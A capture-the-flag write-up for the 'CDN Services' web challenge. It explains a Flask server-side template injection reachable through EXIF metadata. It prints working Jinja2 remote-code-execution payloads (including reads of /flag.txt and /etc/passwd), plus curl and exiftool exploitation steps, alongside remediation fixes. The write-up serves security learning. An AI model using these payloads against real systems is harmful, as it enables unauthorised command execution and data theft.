# CDN Challenge - Complete Analysis Summary

## 🎯 Challenge Overview

**Challenge Name:** CDN Services  
**Event:** Gemastik 2025 Final  
**Category:** Web Security  
**Difficulty:** Medium  
**Objective:** Find and exploit vulnerability to read `/flag.txt`

## 🔍 Vulnerability Discovered

### Vulnerability Type

**Server-Side Template Injection (SSTI)** leading to **Remote Code Execution (RCE)**

### CVSS Score

**9.8 - Critical**

- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: Low (registered user)
- User Interaction: None
- Scope: Changed
- Confidentiality Impact: High
- Integrity Impact: High
- Availability Impact: High

### Root Cause

The application uses `render_template_string()` to dynamically render templates with user-controlled EXIF metadata from uploaded images, without proper escaping or sanitization.

## 📍 Vulnerable Code Location

**File:** `chall/app.py`  
**Function:** `view_post()`  
**Lines:** 228-259

### The Vulnerability

```python
# Line 244-250: Extract EXIF metadata (user-controlled)
for m in re.finditer(r"^\s*(File Name|Date Created)\s*:\s*(.*)$", metadata_full, flags=re.MULTILINE):
    key = m.group(1)
    val = m.group(2).strip()  # ← User-controlled value from EXIF
    md_map[key] = val

file_name_val = md_map["File Name"]  # ← User-controlled
date_created_val = md_map["Date Created"]  # ← User-controlled

# Line 250: Inject user data directly into HTML (NO ESCAPING!)
metadata_snippet_html = f"<pre>File Name: {file_name_val}\nDate Created: {date_created_val}</pre>"

# Line 258: Insert into template string
page_src = tpl_src.replace(placeholder, metadata_snippet_html)

# Line 259: Render with render_template_string (EXECUTES JINJA2!)
return render_template_string(page_src, post=post)  # ← RCE HERE
```

## 🎭 Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. Attacker crafts malicious image with EXIF payload           │
│    Tools: ImageMagick (convert), exiftool                      │
│    Payload: {{ Jinja2 template syntax for RCE }}               │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 2. Attacker registers account and logs in                      │
│    Endpoint: POST /register, POST /login                       │
│    Requirements: Any username/password                          │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 3. Attacker uploads malicious image                            │
│    Endpoint: POST /upload                                       │
│    File: PNG/JPG with malicious EXIF "File Name" field        │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 4. Application processes upload                                 │
│    - Saves image to /app/uploads/                              │
│    - Runs: exiftool <image>                                    │
│    - Stores EXIF metadata in database                          │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 5. Attacker views post                                          │
│    Endpoint: GET /post/<id>                                     │
│    Action: Triggers vulnerable view_post() function            │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 6. Vulnerability triggered                                      │
│    - EXIF data extracted from database                         │
│    - "File Name" value inserted into template                  │
│    - render_template_string() processes Jinja2 syntax         │
│    - Malicious payload EXECUTED                                │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 7. Remote Code Execution achieved                              │
│    - Payload reads /flag.txt                                   │
│    - Flag returned in HTML response                            │
│    - Game Over 🎮                                              │
└─────────────────────────────────────────────────────────────────┘
```

## 💣 Exploitation Methods

### Method 1: Automated (Recommended)

```bash
# Using the provided exploit script
python3 exploit.py --payload flag --target http://localhost:4500
```

### Method 2: Manual

```bash
# 1. Create image
convert -size 100x100 xc:white exploit.png

# 2. Inject payload
exiftool -FileName='{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("cat /flag.txt").read() }}' exploit.png

# 3. Register & Login
curl -X POST http://localhost:4500/register -d "username=hacker&password=pass" -c cookies.txt
curl -X POST http://localhost:4500/login -d "username=hacker&password=pass" -b cookies.txt -c cookies.txt

# 4. Upload
curl -X POST http://localhost:4500/upload -b cookies.txt -F "title=pwn" -F "image=@exploit.png"

# 5. View post (get ID from gallery first)
curl http://localhost:4500/post/1 -b cookies.txt | grep -oP 'GEMASTIK\{[^}]+\}'
```

## 🎯 Payloads Collection

### 1. Read Flag (Primary)

```python
{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("cat /flag.txt").read() }}
```

### 2. Read Flag (Alternative - Using lipsum)

```python
{{ lipsum.__globals__.os.popen("cat /flag.txt").read() }}
```

### 3. Read Flag (Alternative - Using config)

```python
{{ config.__class__.__init__.__globals__["os"].popen("cat /flag.txt").read() }}
```

### 4. Simple Test (7\*7)

```python
{{ 7*7 }}
```

Expected output: `49`

### 5. RCE Test (id command)

```python
{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("id").read() }}
```

Expected output: `uid=1000(ctfuser) gid=1000(ctfuser) ...`

### 6. List Root Directory

```python
{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("ls -la /").read() }}
```

### 7. Read /etc/passwd

```python
{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("cat /etc/passwd").read() }}
```

## 🔧 Technical Details

### Why SSTI Works Here

1. **User Controls Input:** EXIF metadata is set by the attacker
2. **No Validation:** Application trusts EXIF data completely
3. **No Escaping:** Values inserted into template without escaping
4. **Dynamic Rendering:** `render_template_string()` processes Jinja2 syntax
5. **Flask/Jinja2 Globals:** Access to powerful objects like `os`, `sys`, `subprocess`

### Flask/Jinja2 Object Access Chain

```python
"".__class__              # <class 'str'>
  .__mro__                # Method Resolution Order tuple
    [1]                   # <class 'object'> - base object class
      .__subclasses__()   # List of all object subclasses
        [104]             # <class 'warnings.catch_warnings'> (or similar)
          .__init__       # Constructor method
            .__globals__  # Global namespace dictionary
              ["sys"]     # Access sys module
                .modules["os"]  # Access os module
                  .popen("command")  # Execute command
                    .read()  # Read output
```

### Why This Index? [104]

The index `[104]` varies between Python versions and environments. It typically points to a class like:

- `warnings.catch_warnings`
- `os._wrap_close`
- `subprocess.Popen`

These classes have `__init__.__globals__` that contains useful modules.

## 📚 Files Provided

| File                        | Description                                 |
| --------------------------- | ------------------------------------------- |
| `README.md`                 | Quick start guide and summary               |
| `SUMMARY.md`                | This file - complete analysis               |
| `VULNERABILITY_ANALYSIS.md` | Detailed technical analysis and remediation |
| `MANUAL_EXPLOITATION.md`    | Step-by-step manual exploitation guide      |
| `exploit.py`                | Automated exploitation script               |

## 🛡️ Remediation

### Fix 1: Don't Use render_template_string with User Data

```python
# BAD ❌
return render_template_string(page_src, post=post)

# GOOD ✅
return render_template("view_post.html", post=post, metadata=md_map)
```

### Fix 2: Escape User Data

```python
from markupsafe import escape

file_name_val = escape(md_map["File Name"])
date_created_val = escape(md_map["Date Created"])
```

### Fix 3: Enable Autoescape

```python
from jinja2 import Environment

env = Environment(autoescape=True)
template = env.from_string(page_src)
return template.render(post=post)
```

### Fix 4: Validate and Sanitize EXIF Data

```python
import re

def sanitize_metadata(value: str) -> str:
    # Remove template syntax
    value = re.sub(r'\{\{.*?\}\}', '', value)
    value = re.sub(r'\{%.*?%\}', '', value)
    # Limit length
    return value[:100]
```

## 🎓 Learning Points

### For Attackers (Red Team)

1. **EXIF metadata is user-controlled** - Any data users can set is potential injection point
2. **Look for template engines** - Flask/Jinja2, Django, Ruby ERB, etc.
3. **Test dynamic rendering** - `render_template_string()`, `eval()`, `exec()` are red flags
4. **Chain objects to gain access** - Use MRO and `__subclasses__` to reach dangerous classes
5. **Multiple injection points** - Try all user-controlled fields (File Name, Date Created, etc.)

### For Developers (Blue Team)

1. **Never trust user input** - Including metadata, headers, cookies, etc.
2. **Avoid dynamic template rendering** - Use static templates when possible
3. **Always escape user data** - Use framework-provided escaping functions
4. **Enable security features** - Autoescape, CSP, etc.
5. **Principle of least privilege** - App shouldn't run as root
6. **Regular security audits** - Look for SSTI, SQLi, XSS, etc.

## 🔗 References

- **OWASP:** [Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- **HackTricks:** [SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- **PayloadsAllTheThings:** [SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- **PortSwigger:** [Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- **Flask Docs:** [Security Considerations](https://flask.palletsprojects.com/en/2.3.x/security/)

## 🏆 Challenge Solution Summary

**Vulnerability:** Server-Side Template Injection (SSTI) in Flask  
**Exploitation:** Inject Jinja2 payload via EXIF metadata  
**Impact:** Remote Code Execution (RCE)  
**Flag Location:** `/flag.txt`  
**Flag Format:** `GEMASTIK{...}`

### One-Liner Exploit

```bash
# Complete exploit in one command chain
convert -size 100x100 xc:white x.png && \
exiftool -FileName='{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("cat /flag.txt").read() }}' x.png && \
curl -X POST http://localhost:4500/register -d "u=h&p=p" -c c.txt -s && \
curl -X POST http://localhost:4500/login -d "username=h&password=p" -b c.txt -c c.txt -s && \
curl -X POST http://localhost:4500/upload -b c.txt -F "title=x" -F "image=@x.png" -s && \
curl http://localhost:4500/post/1 -b c.txt -s | grep -oP 'GEMASTIK\{[^}]+\}'
```

---

**Happy Hacking! 🚀**

